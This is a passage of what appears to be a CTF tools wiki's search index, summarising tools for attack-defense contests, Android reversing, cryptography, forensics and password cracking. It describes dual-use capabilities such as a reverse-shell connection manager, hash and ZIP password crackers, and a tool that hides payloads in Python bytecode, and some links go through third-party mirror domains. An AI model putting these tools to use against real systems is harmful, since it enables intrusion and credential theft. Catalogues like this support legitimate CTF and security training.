<p>\u5982\u679c\u540c\u65f6\u6709\u5f88\u591a\u670d\u52a1\u5668\u7684\u53cd\u5f39 Shell \u8981\u8fde\uff0c\u5c31\u8981\u5f00\u5f88\u591a\u4e2a nc \u76d1\u542c\uff0c\u8fd9\u6837\u4f1a\u5f88\u9ebb\u70e6\uff0c\u56e0\u6b64\u5c31\u505a\u4e86\u8fd9\u4e2a\u9879\u76ee\u3002</p> <p></p> <p>Download ShellCat</p>"},{"location":"Tool/AWD/ShellCat/#link","title":"Link","text":"<p>Github repo: https://github.com/restran/shellcat</p>"},{"location":"Tool/AWD/awd-submit-flag/","title":"awd-submit-flag","text":"<p>The script to submit flag in the bunch.</p>"},{"location":"Tool/AWD/awd-submit-flag/#dependencies","title":"Dependencies","text":"<p>python(2/3)</p> <p>requests</p> <p>pwntools</p>"},{"location":"Tool/AWD/awd-submit-flag/#quick-start","title":"Quick start","text":"<p>modify <code>quick_exp.py</code>, then run <code>python quick_exp.py</code>.</p> <p></p>"},{"location":"Tool/AWD/awd-submit-flag/#link","title":"Link","text":"<p>Github repo: https://github.sre.pub/0xaww/awd-submit-flag</p>"},{"location":"Tool/AWD/awd-watchbird/","title":"awd-watchbird","text":"<p>A powerful PHP WAF for AWD</p> <p></p>"},{"location":"Tool/AWD/awd-watchbird/#how-to-use","title":"How to use","text":"<ul> <li>\u4e0b\u8f7d\u6700\u65b0 release</li> <li>\u5c06waf.so,watchbird.php\u6587\u4ef6\u5b58\u653e\u5728/var/www/html\u6216\u5176\u4ed6\u76ee\u5f55\u4e2d</li> <li>\u5c06watchbird.php\u653e\u5728www-data\u53ef\u8bfb\u7684\u76ee\u5f55, \u786e\u4fdd\u5f53\u524d\u7528\u6237\u5bf9\u76ee\u6807\u76ee\u5f55\u53ef\u5199, \u7136\u540e\u6267\u884c<code>php watchbird.php --install [Web\u76ee\u5f55]</code>, \u5b89\u88c5\u5668\u5c06\u8f93\u51fa\u5b89\u88c5\u4e86watchbird\u7684\u6587\u4ef6\u8def\u5f84</li> <li>\u8bbf\u95ee\u4efb\u610f\u542f\u7528\u4e86waf\u7684\u6587\u4ef6, \u53c2\u6570<code>?watchbird=ui</code>\u6253\u5f00watchbird\u63a7\u5236\u53f0, \u521b\u5efa\u4e00\u4e2a\u521d\u59cb\u5bc6\u7801</li> <li>\u5982\u9700\u5378\u8f7d, \u8bf7\u5728\u76f8\u540c\u7684\u4f4d\u7f6e\u8f93\u5165<code>php watchbird.php --uninstall [Web\u76ee\u5f55]</code>, \u5982\u679c\u60a8\u591a\u6b21\u8fd0\u884c\u4e86\u5b89\u88c5, \u8bf7\u591a\u6b21\u8fd0\u884c\u5378\u8f7d\u76f4\u5230\u5378\u8f7d\u5668\u65e0\u8f93\u51fa</li> </ul>"},{"location":"Tool/AWD/awd-watchbird/#deployment","title":"Deployment","text":"<ul> <li><code>git clone https://github.com/leohearts/awd-watchbird.git</code></li> <li>\u4f7f\u7528 <code>pyhton3 pack.py</code> \u5c06\u6e90\u7801\u6253\u5305\u4e3a\u5355\u6587\u4ef6</li> <li>\u7f16\u8bd1waf.c\u751f\u6210.so\u6587\u4ef6,\u53c2\u8003\u547d\u4ee4:gcc waf.c -shared -o waf.so</li> </ul>"},{"location":"Tool/AWD/awd-watchbird/#screenshot","title":"Screenshot","text":""},{"location":"Tool/AWD/awd-watchbird/#link","title":"Link","text":"<p>Github repo: https://github.sre.pub/leohearts/awd-watchbird</p>"},{"location":"Tool/AWD/flower/","title":"flower","text":"<p>TCP flow analyzer with sugar for Attack/Defense CTF</p>"},{"location":"Tool/AWD/flower/#what-is-it","title":"What is it?","text":"<p>Flower is an automatic packet analyzer made by Ca' Foscari University team for the CyberChallenge attack/defense CTF held in Rome on June 27th, 2018.</p> <p>This tool was written in less than ten days, but it works! Every contribution is welcome!</p> <p>Presentation of Flower (from min 7:30), and general introduction to CTFs at ESC2K18 in Italian:</p> <p></p>"},{"location":"Tool/AWD/flower/#features","title":"Features","text":"<ul> <li>Only one command needed to have it up, thanks to docker.</li> <li>Flow list</li> <li>Vim like navigation ( <code>k</code> and <code>j</code> to navigate the list)</li> <li>Regex filtering with highlight </li> <li>Highlight in red flow with flags</li> <li>Favorite management</li> <li>Time filter</li> <li>Service filter </li> <li>Colored hex dump </li> <li>Automatic export GET/POST requests directly in python-format </li> <li>Automatic export to pwntools </li> </ul>"},{"location":"Tool/AWD/flower/#getting-started","title":"Getting Started","text":""},{"location":"Tool/AWD/flower/#run-with-docker","title":"Run with docker","text":"<p>Clone the repo, enter in the directory, and just run <code>docker-compose up</code>, and after a while, you will find flower at http://localhost:3000.</p> <p>For the flag regex, modify <code>REACT_APP_FLAG_REGEX</code> in <code>docker-compose.yml</code>.</p> <p>The build will automatically import the test pcaps.</p> <p>To enter in the service to import other pcaps, run <code>docker exec -it flower_flower-python_1 /bin/bash</code> (if the flower is in a folder with a different name, modify the prefix after <code>-it</code>). The container shares the <code>/shared</code> folder with the host. Put the pcap files inside this folder and use <code>python services/importer.py /shared/pcap_file_here</code> from the container to import pcaps to flower.</p>"},{"location":"Tool/AWD/flower/#manual-installation","title":"Manual installation","text":"<ol> <li>Clone and install dependencies</li> </ol> <p><code>git clone https://github.com/secgroup/flower    cd flower    npm install     pip install -r services/requirements.txt</code></p> <ol> <li> <p>(Optional) Set the following environment variables:</p> </li> <li> <p><code>REACT_APP_FLOWER_MONGO</code> IP of the host that will have flower db active (MongoDB)</p> </li> <li><code>REACT_APP_FLOWER_SERVICES</code> IP of the host that will have services active</li> <li> <p><code>REACT_APP_FLAG_REGEX</code> regex that matches flags.</p> </li> <li> <p>Mongodb is required on the same machine that run the services. To start it: <code>sudo mongod --dbpath /path/to/mongodb/db --bind_ip 0.0.0.0</code></p> </li> </ol>"},{"location":"Tool/AWD/flower/#run","title":"Run","text":"<ol> <li>Start flower</li> </ol> <p><code>./run.sh</code></p> <ol> <li>Start flower services</li> </ol> <p><code>cd services    ./run_ws.sh</code></p> <p>Once everything has been started, the flower should be accessible at the address of the machine that started it on port 3000.</p>"},{"location":"Tool/AWD/flower/#pcap-import","title":"Pcap import","text":"<p>You must first install pynids from here. The pip version is outdated! Good luck with the installation. Then, you can import pcaps into MongoDB by executing the provided script <code>importer.py</code> as follows:</p> <pre><code>cd services\n./importer.py pcap_file.pcap\n</code></pre> <p>You can find a test_pcap in <code>services/test_pcap</code>. For a quick demo, run <code>./importer.py test_pcap/dump-2018-06-27_13:25:31.pcap</code></p>"},{"location":"Tool/AWD/flower/#security-tips-important","title":"Security tips (Important!)","text":"<p>If you are going to use the flower in a CTF, remember to set up the firewall in the most appropriate way, as the current implementation does not use other security techniques.</p> <p>If you ignore this, everybody will be able to connect to your database and steal all your flags!</p>"},{"location":"Tool/AWD/flower/#link","title":"Link","text":"<p>Github repo: https://news.topnotch.works/host-https-github.com/secgroup/flower</p>"},{"location":"Tool/Android/APKTool/","title":"APKTool","text":"<p>A tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications. It also makes working with an app easier because of the project like file structure and automation of some repetitive tasks like building apk, etc.</p> <p>It is NOT intended for piracy and other non-legal uses. It could be used for localizing, adding some features or support for custom platforms, analyzing applications and much more.</p> <pre><code>$ apktool d test.apk\nI: Using Apktool 2.7.0 on test.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: 1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n$ apktool b test\nI: Using Apktool 2.7.0 on test\nI: Checking whether sources has changed...\nI: Smaling smali folder into classes.dex...\nI: Checking whether resources has changed...\nI: Building resources...\nI: Building apk file...\nI: Copying unknown files/dir...\n</code></pre>"},{"location":"Tool/Android/APKTool/#features","title":"Features","text":"<ul> <li>Disassembling resources to nearly original form (including <code>resources.arsc</code>, <code>classes.dex</code>, <code>9.png.</code> and <code>XMLs</code>)</li> <li>Rebuilding decoded resources back to binary APK/JAR</li> <li>Organizing and handling APKs that depend on framework resources</li> <li>Smali Debugging (Removed in <code>2.1.0</code> in favor of IdeaSmali)</li> <li>Helping with repetitive tasks</li> </ul>"},{"location":"Tool/Android/APKTool/#requirements","title":"Requirements","text":"<ul> <li>Java 8 (JRE 1.8)</li> <li>Basic knowledge of Android SDK, AAPT and smali</li> </ul>"},{"location":"Tool/Android/APKTool/#links","title":"Links","text":"<p>https://ibotpeaches.github.io/Apktool/</p> <p>https://github.com/iBotPeaches/Apktool</p>"},{"location":"Tool/Android/LDPlayer/","title":"LDPlayer","text":"<p>LDPlayer is a free Android emulator to play mobile games on a PC with a mouse and keyboard. It provides the fastest performance for Android gaming.</p>"},{"location":"Tool/Android/LDPlayer/#links","title":"Links","text":"<p>https://en.ldplayer.net/</p>"},{"location":"Tool/Android/dex2jar/","title":"dex2jar","text":"<p>Tools to work with android .dex and java .class files.</p> <ol> <li>dex-reader/writer: Read/write the Dalvik Executable (.dex) file. It has a light weight API similar with ASM.</li> <li>d2j-dex2jar: Convert .dex file to .class files (zipped as jar)</li> <li>smali/baksmali: disassemble dex to smali files and assemble dex from smali files. different implementation to smali/baksmali, same syntax, but we support escape in type desc \"Lcom/dex2jar\\t\\u1234;\"</li> <li>other tools: d2j-decrypt-string</li> </ol>"},{"location":"Tool/Android/dex2jar/#usage","title":"Usage","text":"<ol> <li>In the root directory run: ./gradlew distZip</li> <li>cd dex-tools/build/distributions</li> <li>Unzip the file dex-tools-2.1-SNAPSHOT.zip (file size should be ~5 MB)</li> <li>Run d2j-dex2jar.sh from the unzipped directory</li> </ol>"},{"location":"Tool/Android/dex2jar/#example-usage","title":"Example usage:","text":"<p>sh d2j-dex2jar.sh -f ~/path/to/apk_to_decompile.apk</p> <p>And the output file will be <code>apk_to_decompile-dex2jar.jar</code>.</p>"},{"location":"Tool/Android/dex2jar/#links","title":"Links","text":"<p>https://github.com/pxb1988/dex2jar</p>"},{"location":"Tool/Android/jadx/","title":"jadx","text":"<p>jadx - Dex to Java decompiler</p> <p>Command line and GUI tools for producing Java source code from Android Dex and Apk files</p> <p>\u2757\u2757\u2757 Please note that in most cases jadx can't decompile all 100% of the code, so errors will occur. Check Troubleshooting guide for workarounds</p> <p>Main features:</p> <ul> <li>decompile Dalvik bytecode to java classes from APK, dex, aar, aab and zip files</li> <li>decode <code>AndroidManifest.xml</code> and other resources from <code>resources.arsc</code></li> <li>deobfuscator included</li> </ul> <p>jadx-gui features:</p> <ul> <li>view decompiled code with highlighted syntax</li> <li>jump to declaration</li> <li>find usage</li> <li>full text search</li> <li>smali debugger, check wiki page for setup and usage</li> </ul> <p>Jadx-gui key bindings can be found here</p> <p>See these features in action here: jadx-gui features overview</p> <p></p>"},{"location":"Tool/Android/jadx/#download","title":"Download","text":"<ul> <li>release from github: </li> <li>latest unstable build </li> </ul> <p>After download unpack zip file go to <code>bin</code> directory and run:</p> <ul> <li><code>jadx</code> - command line version</li> <li><code>jadx-gui</code> - UI version</li> </ul> <p>On Windows run <code>.bat</code> files with double-click Note: ensure you have installed Java 11 or later 64-bit version. For Windows, you can download it from oracle.com (select x64 Installer).</p>"},{"location":"Tool/Android/jadx/#install","title":"Install","text":"<ol> <li>Arch linux </li> </ol> <p><code>sudo pacman -S jadx</code></p> <ol> <li>macOS </li> </ol> <p><code>brew install jadx</code></p> <ol> <li>Flathub </li> </ol> <p><code>flatpak install flathub com.github.skylot.jadx</code></p>"},{"location":"Tool/Android/jadx/#use-jadx-as-a-library","title":"Use jadx as a library","text":"<p>You can use jadx in your java projects, check details on wiki page</p>"},{"location":"Tool/Android/jadx/#build-from-source","title":"Build from source","text":"<p>JDK 8 or higher must be installed:</p> <pre><code>git clone https://github.com/skylot/jadx.git\ncd jadx\n./gradlew dist\n</code></pre> <p>(on Windows, use <code>gradlew.bat</code> instead of <code>./gradlew</code>)</p> <p>Scripts for run jadx will be placed in <code>build/jadx/bin</code> and also packed to <code>build/jadx-&lt;version&gt;.zip</code></p>"},{"location":"Tool/Android/jadx/#links","title":"Links","text":"<p>https://github.com/skylot/jadx</p>"},{"location":"Tool/Cryptography/Ciphey/","title":"Ciphey","text":"<p>\u26a1 Automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes \u26a1</p>"},{"location":"Tool/Cryptography/Ciphey/#what-is-this","title":"\ud83e\udd14 What is this?","text":"<p>Input encrypted text, get the decrypted text back.</p> <p>\"What type of encryption?\"</p> <p>That's the point. You don't know, you just know it's possibly encrypted. Ciphey will figure it out for you.</p> <p>Ciphey can solve most things in 3 seconds or less.</p> <p></p> <p>Ciphey aims to be a tool to automate a lot of decryptions &amp; decodings such as multiple base encodings, classical ciphers, hashes or more advanced cryptography.</p> <p>If you don't know much about cryptography, or you want to quickly check the ciphertext before working on it yourself, Ciphey is for you.</p> <p>The technical part. Ciphey uses a custom built artificial intelligence module (AuSearch) with a Cipher Detection Interface to approximate what something is encrypted with. And then a custom-built, customisable natural language processing Language Checker Interface, which can detect when the given text becomes plaintext.</p> <p>No neural networks or bloated AI here. We only use what is fast and minimal.</p> <p>And that's just the tip of the iceberg. For the full technical explanation, check out our documentation.</p>"},{"location":"Tool/Cryptography/Ciphey/#features","title":"\u2728 Features","text":"<ul> <li>50+ encryptions/encodings supported such as binary, Morse code and Base64. Classical ciphers like the Caesar cipher, Affine cipher and the Vigenere cipher. Along with modern encryption like repeating-key XOR and more. For the full list, click here</li> <li>Custom Built Artificial Intelligence with Augmented Search (AuSearch) for answering the question \"what encryption was used?\" Resulting in decryptions taking less than 3 seconds.</li> <li>Custom built natural language processing module Ciphey can determine whether something is plaintext or not. Whether that plaintext is JSON, a CTF flag, or English, Ciphey can get it in a couple of milliseconds.</li> <li>Multi Language Support at present, only German &amp; English (with AU, UK, CAN, USA variants).</li> <li>Supports encryptions and hashes Which the alternatives such as CyberChef Magic do not.</li> <li>C++ core Blazingly fast.</li> </ul>"},{"location":"Tool/Cryptography/Ciphey/#links","title":"Links","text":"<p>https://github.com/Ciphey/Ciphey</p>"},{"location":"Tool/Cryptography/RSAWiener/","title":"RSA Wiener Attack","text":"<p>Used to attack RSA when the exponent is too small or too large.</p>"},{"location":"Tool/Cryptography/RSAWiener/#link","title":"Link","text":"<p>GitHub repo: https://github.com/pablocelayes/rsa-wiener-attack</p>"},{"location":"Tool/Cryptography/SageMathCell/","title":"SageMathCell","text":"<p>SageMathCell project is an easy-to-use web interface to a free open-source mathematics software system SageMath. You can help SageMath by becoming a sponsor.</p> <p>It allows embedding Sage computations into any webpage: check out our short instructions, a comprehensive description of capabilities, or Notebook Player to convert Jupyter notebooks into dynamic HTML pages!</p> <p>Resources for your computation are provided by Departamento de Matem\u00e1ticas, Universidad Aut\u00f3noma de Madrid. You can also set up your own server.</p>"},{"location":"Tool/Cryptography/SageMathCell/#homepage","title":"Homepage","text":"<p>https://sagecell.sagemath.org/</p>"},{"location":"Tool/Cryptography/hashcat/","title":"HashCat","text":"<p>Crack hash to find the plain text.</p>"},{"location":"Tool/Cryptography/hashcat/#abstract","title":"Abstract","text":"<ul> <li>World's fastest password cracker</li> <li>World's first and only in-kernel rule engine</li> </ul>"},{"location":"Tool/Cryptography/hashcat/#link","title":"Link","text":"<p>Official link: https://hashcat.net/hashcat/</p>"},{"location":"Tool/Forensics/BlindWatermark/","title":"Blind Watermark","text":"<p>Some of the blind watermark challenges have 2 very similar pictures.</p> <p>But occasionally, we don't have the origin picture.</p>"},{"location":"Tool/Forensics/BlindWatermark/#link","title":"Link","text":"<p>GitHub repo: https://github.com/guofei9987/blind_watermark</p>"},{"location":"Tool/Forensics/ProcessMonitor/","title":"Process Monitor","text":"<p>Check the system calls for process under Windows system.</p>"},{"location":"Tool/Forensics/ProcessMonitor/#abstract","title":"Abstract","text":"<p>Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity. It combines the features of two legacy Sysinternals utilities, Filemon and Regmon, and adds an extensive list of enhancements including rich and non-destructive filtering, comprehensive event properties such as session IDs and user names, reliable process information, full thread stacks with integrated symbol support for each operation, simultaneous logging to a file, and much more. Its uniquely powerful features will make Process Monitor a core utility in your system troubleshooting and malware hunting toolkit.</p>"},{"location":"Tool/Forensics/ProcessMonitor/#link","title":"Link","text":"<p>Official document: https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</p> <p>Download: https://download.sysinternals.com/files/ProcessMonitor.zip</p>"},{"location":"Tool/Forensics/Tracewrangler/","title":"Tracewrangler","text":"<p>Yet another PCAP file monitor.</p>"},{"location":"Tool/Forensics/Tracewrangler/#abstract","title":"Abstract","text":"<p>TraceWrangler is a network capture file toolkit running on Windows (or on Linux, using WINE) that supports PCAP as well as the new PCAPng file format, which is now the standard file format used by Wireshark. The most prominent use case for TraceWrangler is the easy sanitization and anonymization of PCAP and PCAPng files (sometimes called \"trace files\", \"capture files\" or \"packet captures\"), removing or replacing sensitive data while being easy to use.</p>"},{"location":"Tool/Forensics/Tracewrangler/#link","title":"Link","text":"<p>Official link: https://www.tracewrangler.com/</p>"},{"location":"Tool/Forensics/Wireshark/","title":"Wireshark","text":"<p>Network traffic sniffer.</p>"},{"location":"Tool/Forensics/Wireshark/#abstract","title":"Abstract","text":"<p>Wireshark is the world\u2019s foremost and widely-used network protocol analyzer. It lets you see what\u2019s happening on your network at a microscopic level and is the de facto (and often de jure) standard across many commercial and non-profit enterprises, government agencies, and educational institutions. Wireshark development thrives thanks to the volunteer contributions of networking experts around the globe and is the continuation of a project started by Gerald Combs in 1998.</p>"},{"location":"Tool/Forensics/Wireshark/#link","title":"Link","text":"<p>Official website: https://www.wireshark.org/</p>"},{"location":"Tool/Forensics/exiftool/","title":"ExifTool","text":"<p>Meta data forensics.</p>"},{"location":"Tool/Forensics/exiftool/#abstract","title":"Abstract","text":"<p>ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files. ExifTool supports many different metadata formats including EXIF, GPS, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP and ID3, Lyrics3, as well as the maker notes of many digital cameras by Canon, Casio, DJI, FLIR, FujiFilm, GE, GoPro, HP, JVC/Victor, Kodak, Leaf, Minolta/Konica-Minolta, Motorola, Nikon, Nintendo, Olympus/Epson, Panasonic/Leica, Pentax/Asahi, Phase One, Reconyx, Ricoh, Samsung, Sanyo, Sigma/Foveon and Sony.</p>"},{"location":"Tool/Forensics/exiftool/#link","title":"Link","text":"<p>Official link: https://exiftool.org/</p>"},{"location":"Tool/Forensics/foremost/","title":"foremost","text":"<p>Combined file forensics.</p>"},{"location":"Tool/Forensics/foremost/#abstract","title":"Abstract","text":"<p>Foremost is a forensic program to recover lost files based on their headers, footers, and internal data structures.</p> <p>Foremost can work on image files, such as those generated by dd, Safeback, Encase, etc, or directly on a drive. The headers and footers can be specified by a configuration file or you can use command line switches to specify built-in file types. These built-in types look at the data structures of a given file format allowing for a more reliable and faster recovery.</p>"},{"location":"Tool/Forensics/foremost/#link","title":"Link","text":"<p>Kali foremost description: https://www.kali.org/tools/foremost/</p> <p>Download link: https://sourceforge.net/projects/foremost/</p>"},{"location":"Tool/Forensics/stegosaurus/","title":"stegosaurus","text":"<p>A steganography tool. Used when you can't find any other choices.</p>"},{"location":"Tool/Forensics/stegosaurus/#abstract","title":"Abstract","text":"<p>Stegosaurus is a steganography tool that allows embedding arbitrary payloads in Python bytecode (pyc or pyo) files. The embedding process does not alter the runtime behavior or file size of the carrier file and typically results in a low encoding density. The payload is dispersed throughout the bytecode so tools like <code>strings</code> will not show the actual payload. Python's <code>dis</code> module will return the same results for bytecode before and after Stegosaurus is used to embed a payload. At this time, no prior work or detection methods are known for this type of payload delivery.</p>"},{"location":"Tool/Forensics/stegosaurus/#link","title":"Link","text":"<p>GitHub repo: https://github.com/AngelKitty/stegosaurus</p>"},{"location":"Tool/Forensics/stegsolve/","title":"stegsolve","text":"<p>Image forensics tool.</p>"},{"location":"Tool/Forensics/stegsolve/#install","title":"Install","text":"<pre><code>#!/bin/bash -ex\n\nwget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar\nchmod +x stegsolve.jar\nmkdir bin\nmv stegsolve.jar bin/\n</code></pre> <p>Download jar file: http://www.caesum.com/handbook/Stegsolve.jar</p>"},{"location":"Tool/Forensics/volatility/","title":"volatility","text":"<p>Memory forensics tool.</p>"},{"location":"Tool/Forensics/volatility/#abstract","title":"Abstract","text":"<p>The Volatility Framework is a completely open collection of tools, implemented in Python under the GNU General Public License, for the extraction of digital artifacts from volatile memory (RAM) samples. The extraction techniques are performed completely independent of the system being investigated but offer visibilty into the runtime state of the system. The framework is intended to introduce people to the techniques and complexities associated with extracting digital artifacts from volatile memory samples and provide a platform for further work into this exciting area of research.</p>"},{"location":"Tool/Forensics/volatility/#link","title":"Link","text":"<p>GitHub repo: https://github.com/volatilityfoundation/volatility</p> <p>volatility3: https://github.com/volatilityfoundation/volatility3</p>"},{"location":"Tool/Forensics/zsteg/","title":"zsteg","text":"<p>PNG / BMP file forensics tool.</p>"},{"location":"Tool/Forensics/zsteg/#link","title":"Link","text":"<p>GitHub repo: https://github.com/zed-0xff/zsteg</p>"},{"location":"Tool/Miscellaneous/AZPR/","title":"Advanced ZIP Password Recovery","text":"<p>Break zip password if you don't want to use John the Ripper.</p> <p>The software isn't free.</p>"},{"location":"Tool/Miscellaneous/AZPR/#abstract","title":"Abstract","text":"<p>Advanced ZIP Password Recovery (or AZPR) is a program to recover lost or forgotten passwords to ZIP archives (compressed files) created in programs like WinZip, PKZip etc.</p>"},{"location":"Tool/Miscellaneous/AZPR/#link","title":"Link","text":"<p>Official: https://www.elcomsoft.com/help/en/azpr/</p>"},{"location":"Tool/Miscellaneous/Velato/","title":"Velato","text":"<p>Music programming language.</p>"},{"location":"Tool/Miscellaneous/Velato/#abstract","title":"Abstract","text":"<p>Velato is a programming language, created by Daniel Temkin in 2009, which uses MIDI files as source code: the pattern of notes determines commands. Velato offers an unusual challenge to programmer-musicians: to compose a musical piece that, in addition to expressing their aims musically, fills the constraints necessary to compile to a working Velato program. Each song has a secret message: the program it determines when compiled as Velato.</p>"},{"location":"Tool/Miscellaneous/Velato/#link","title":"Link","text":"<p>Official document: http://velato.net/</p> <p>Download compiler: http://velato.net/Content/Velato/Velato_0_1.zip</p>"},{"location":"Tool/Miscellaneous/bochs/","title":"Bochs","text":"<p>Used in a floppy disk challenge.</p> <p>Open floppy disk image with bochs.</p>"},{"location":"Tool/Miscellaneous/bochs/#abstract","title":"Abstract","text":"<p>Bochs is a highly portable open source IA-32 (x86) PC emulator written in C++, that runs on most popular platforms. It includes emulation of the Intel x86 CPU, common I/O devices, and a custom BIOS. Bochs can be compiled to emulate many different x86 CPUs, from early 386 to the most recent x86-64 Intel and AMD processors which may even not reached the market yet. Bochs is capable of running most Operating Systems inside the emulation including Linux, DOS or Microsoft Windows. Bochs was originally written by Kevin Lawton and is currently maintained by this project.   Bochs can be compiled and used in a variety of modes, some which are still in development. The 'typical' use of bochs is to provide complete x86 PC emulation, including the x86 processor, hardware devices, and memory. This allows you to run OS's and software within the emulator on your workstation, much like you have a machine inside of a machine. For instance, let's say your workstation is a Unix/X11 workstation, but you want to run Win'95 applications. Bochs will allow you to run Win 95 and associated software on your Unix/X11 workstation, displaying a window on your workstation, simulating a monitor on a PC.</p>"},{"location":"Tool/Miscellaneous/bochs/#official-link","title":"Official Link","text":"<p>Website: https://bochs.sourceforge.io/</p> <p>Download: https://sourceforge.net/projects/bochs/files/bochs/</p>"},{"location":"Tool/Miscellaneous/john/","title":"John The Ripper (jumbo)","text":"<p>Used in various password cracking.</p>"},{"location":"Tool/Miscellaneous/john/#abstract","title":"Abstract","text":"<p>John the Ripper is free and Open Source software, distributed primarily in source code form. If you would rather use a commercial product, please consider John the Ripper Pro, which is distributed primarily in the form of \"native\" packages for the target operating systems and in general is meant to be easier to install and use while delivering optimal performance.</p>"},{"location":"Tool/Miscellaneous/john/#link","title":"Link","text":"<p>Official website: https://www.openwall.com/john/</p> <p>John (jumbo): https://github.com/openwall/john</p> <p>The download depends on the system you are using.</p>"},{"location":"Tool/Miscellaneous/qemu/","title":"qemu","text":"<p>Useful when using some DOS thing.</p> <p>A DOS emulator.</p>"},{"location":"Tool/Miscellaneous/qemu/#abstract","title":"Abstract","text":""},{"location":"Tool/Miscellaneous/qemu/#link","title":"Link","text":"<p>Official website: https://www.qemu.org/download/#windows</p> <p>Download: https://qemu.weilnetz.de/w64/</p>"},{"location":"Tool/PWN/PEiD/","title":"PEiD","text":""},{"location":"Tool/PWN/PEiD/#description","title":"Description","text":"<ul> <li>PEiD detects most common packers, cryptors and compilers for PE files.</li> <li>It can currently detect more than 470 different signatures in PE files.</li> <li>It seems that the official website (www.peid.info) has been discontinued. Hence, the tool is no longer available from the official website but it still hosted on other sites.</li> </ul>"},{"location":"Tool/PWN/PEiD/#installation","title":"Installation","text":""},{"location":"Tool/PWN/PEiD/#peid_1","title":"PEiD","text":"<ul> <li>Go to http://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/PEiD-updated.shtml</li> <li>Download PEiD-0.95-20081103.zip.</li> <li>Uncompress the archive. You should have a similar tree:</li> </ul> <pre><code>.\n\u251c\u2500\u2500 external.txt\n\u251c\u2500\u2500 PEiD.exe\n\u251c\u2500\u2500 plugins\n\u2502   \u251c\u2500\u2500 GenOEP.dll\n\u2502   \u251c\u2500\u2500 ImpREC.dll\n\u2502   \u251c\u2500\u2500 kanal.dll\n\u2502   \u251c\u2500\u2500 kanal.htm\n\u2502   \u2514\u2500\u2500 ZDRx.dll\n\u251c\u2500\u2500 pluginsdk\n\u2502   \u251c\u2500\u2500 C++\n\u2502   \u2502   \u251c\u2500\u2500 defs.h\n\u2502   \u2502   \u2514\u2500\u2500 null.c\n\u2502   \u251c\u2500\u2500 Delphi\n\u2502   \u2502   \u2514\u2500\u2500 Sample.dpr\n\u2502   \u251c\u2500\u2500 MASM\n\u2502   \u2502   \u251c\u2500\u2500 compile.bat\n\u2502   \u2502   \u251c\u2500\u2500 masm_plugin.asm\n\u2502   \u2502   \u2514\u2500\u2500 masm_plugin.def\n\u2502   \u251c\u2500\u2500 PowerBASIC\n\u2502   \u2502   \u2514\u2500\u2500 PEiD_Plugin.bas\n\u2502   \u2514\u2500\u2500 readme.txt\n\u251c\u2500\u2500 readme.txt\n\u2514\u2500\u2500 userdb.txt\n</code></pre>"},{"location":"Tool/PWN/PEiD/#signatures","title":"Signatures","text":"<p>Update your signatures (initial file is empty). Replace the initial userdb.txt file with one of these files:</p> <ul> <li>http://handlers.sans.org/jclausing/userdb.txt</li> <li>http://reverse-engineering-scripts.googlecode.com/files/UserDB.TXT</li> <li>http://research.pandasecurity.com/blogs/images/userdb.txt</li> </ul>"},{"location":"Tool/PWN/PEiD/#interface","title":"Interface","text":""},{"location":"Tool/PWN/PEiD/#main-interface","title":"Main interface","text":""},{"location":"Tool/PWN/PEiD/#section-viewer","title":"Section Viewer","text":""},{"location":"Tool/PWN/PEiD/#pe-disassembler","title":"PE disassembler","text":""},{"location":"Tool/PWN/PEiD/#pe-details","title":"PE details","text":""},{"location":"Tool/PWN/PEiD/#extra-information","title":"Extra information","text":""},{"location":"Tool/PWN/PEiD/#menu","title":"Menu","text":""},{"location":"Tool/PWN/PEiD/#screenshot","title":"Screenshot","text":""},{"location":"Tool/PWN/PEiD/#generic-oep-finder","title":"Generic OEP Finder","text":"<p>In some cases, PEiD can find the Original Entry Point (OEP) of a packed executable:</p> <p></p>"},{"location":"Tool/PWN/PEiD/#krypto-analyzer","title":"Krypto Analyzer","text":""},{"location":"Tool/PWN/WinDbg/","title":"WinDbg","text":"<p>The Windows Debugger (WinDbg) can be used to debug kernel-mode and user-mode code, analyze crash dumps, and examine the CPU registers while the code executes.</p> <p>To get started with Windows debugging, see Getting Started with Windows Debugging.</p>"},{"location":"Tool/PWN/WinDbg/#download-windbg-preview","title":"Download WinDbg Preview","text":"<p>WinDbg Preview is a new version of WinDbg with more modern visuals, faster windows, and a full-fledged scripting experience. It is built with the extensible object-orientated debugger data model front and center. WinDbg Preview is using the same underlying engine as WinDbg today, so all the commands, extensions, and workflows still work as they did before.</p> <ul> <li>Download WinDbg Preview from the Microsoft Store: WinDbg Preview.</li> <li>Learn more about installation and configuration in WinDbg Preview - Installation.</li> </ul>"},{"location":"Tool/PWN/WinDbg/#debugging-tools-for-windows-10-windbg","title":"Debugging Tools for Windows 10 (WinDbg)","text":"<p>Get Debugging Tools for Windows (WinDbg) from the SDK: Windows 10 SDK. Use the download link on the Windows 10 SDK page, as the Debugging Tools for Windows are not available as part of Visual Studio.</p> <p>If you just need the Debugging Tools for Windows, and not the Windows Driver Kit (WDK) for Windows 10, you can install the debugging tools as a standalone component from the Windows Software Development Kit (SDK).</p> <p>In the SDK installation wizard, select Debugging Tools for Windows, and deselect all other components.</p> <p></p>"},{"location":"Tool/PWN/WinDbg/#adding-the-debugging-tools-for-windows-if-the-sdk-is-already-installed","title":"Adding the Debugging Tools for Windows if the SDK is already installed","text":"<p>If the Windows SDK is already installed, open Settings, navigate to Apps &amp; features, select Windows Software Development Kit, and then select Modify to change the installation to add Debugging Tools for Windows.</p>"},{"location":"Tool/PWN/WinDbg/#looking-for-the-debugging-tools-for-earlier-versions-of-windows","title":"Looking for the debugging tools for earlier versions of Windows?","text":"<p>To download the debugger tools for previous versions of Windows, you need to download the Windows SDK for the version you are debugging from the Windows SDK and emulator archive. In the installation wizard of the SDK, select Debugging Tools for Windows, and deselect all other components.</p>"},{"location":"Tool/PWN/WinDbg/#learn-more-about-the-debuggers","title":"Learn more about the 